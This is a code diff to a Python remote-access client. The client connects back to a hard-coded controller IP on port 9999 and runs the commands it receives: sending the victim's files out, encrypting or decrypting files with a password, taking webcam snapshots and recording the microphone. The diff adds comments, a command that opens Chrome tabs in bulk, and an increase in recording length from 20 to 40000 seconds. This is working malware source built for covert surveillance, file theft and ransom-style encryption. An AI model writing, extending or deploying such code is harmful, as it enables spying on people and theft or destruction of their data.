@@ -4,6 +4,7 @@ import time
 import socket
 import random
 import pyaudio
+import webbrowser
 import subprocess
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
@@ -20,7 +21,7 @@ def socket_create():
         global host
         global port
         global s
-        host = '192.168.0.171'
+        host = '192.168.1.223'
         # host = get_lan_ip()
         port = 9999
         s = socket.socket()
@@ -79,43 +80,48 @@ def receive_commands():
         data = s.recv(20480)
         command = data.decode("utf-8")
         command_with_data = command.split()
+        # Enter a directory
         if data[:2].decode("utf-8") == 'cd':
             try:
                 os.chdir(data[3:].decode("utf-8"))
             except:
                 pass
+        # Quit the direct connection and letting the server connect to
+        # another computer
         if data[:].decode("utf-8") == 'quit':
             s.close()
             break
+        # Show the server the computer is actually connected
         if data.decode("utf-8") == 'list':
             output_str = "Command not recognized" + "\n"
             s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+        # The rest of the commands
         elif len(data) > 0:
             # File transfer
-            # """
             if data[:8].decode("utf-8") == 'transfer':
                 file_name = data[9:].decode("utf-8")
                 file_path = str(os.getcwd()) + chr(92) + file_name
+                # Checks if the file exists
                 if not os.path.exists(file_path):
                     output_str = "The file does not exist" + "\n"
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
                 else:
                     try:
+                        # Tries to send the file to the server
                         send_file(file_path)
                     except:
                         output_str = "Could not transfer the file" + "\n"
                         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                         print(output_str)
 
-            # """
-            # The rest of commands
-
+            # File encryption
             elif command_with_data[0] == 'encrypt':
                 file_name = command_with_data[1]
                 file_path = str(os.getcwd()) + chr(92) + file_name
                 password = command_with_data[2]
                 try:
+                    # Tries to encrypt the file using our function
                     encrypt(get_key(password), file_name, file_path)
                     output_str = "File encrypted" + "\n"
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
@@ -124,6 +130,7 @@ def receive_commands():
                     output_str = "Could not encrypt the file" + "\n"
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
+            # File decryption
             elif command_with_data[0] == 'decrypt':
                 file_name = command_with_data[1]
                 file_path = str(os.getcwd()) + chr(92) + file_name
@@ -137,12 +144,29 @@ def receive_commands():
                     output_str = "Could not decrypt the file" + "\n"
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
+            # Open tabs in chrome
+            elif command_with_data[0] == 'open' and command_with_data[
+                1] == 'chrome':
+                try:
+                    amount_of_windows = int(command_with_data[3])
+                    url_to_open = command_with_data[2]
+                    open_chrome(url_to_open, amount_of_windows)
+                    output_str = str(
+                        amount_of_windows) + " windows were opened" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+                except:
+                    output_str = "Could not open the windows" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+            # Take a photo using the computer's camera
             elif data.decode("utf-8").__contains__('show camera'):
                 video = cv2.VideoCapture(0)
                 check, frame = video.read()
                 ddd = frame.flatten()
                 sss = ddd.tostring()
                 s.send(sss)
+            # Record audio through the computer's microphone
             elif data.decode("utf-8").__contains__('record audio'):
                 send_audio()
 
@@ -261,7 +285,7 @@ def send_audio():
     audio_format = pyaudio.paInt16
     channels = 1
     rate = 44100
-    record_seconds = 20
+    record_seconds = 40000
 
     p = pyaudio.PyAudio()
     stream = p.open(format=audio_format,
@@ -286,6 +310,26 @@ def send_audio():
 
     output_str = "The file was sent" + "\n"
     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+
+
+def open_chrome(url, amount_tabs_to_open):
+    """
+    The function opens a tab in Chrome a curtain amount of times given
+    by the server
+
+    :param url: The url the server tries to open
+    :type url: str
+
+    :param amount_tabs_to_open: The amount of times to open the page
+    :type amount_tabs_to_open: int
+
+    :return: None
+    """
+    for x in range(0, amount_tabs_to_open):
+        webbrowser.open_new(url)
+        # In order to open all the windows in the right form
+        # we have to delay the command
+        time.sleep(0.3)
 
 
 def main():
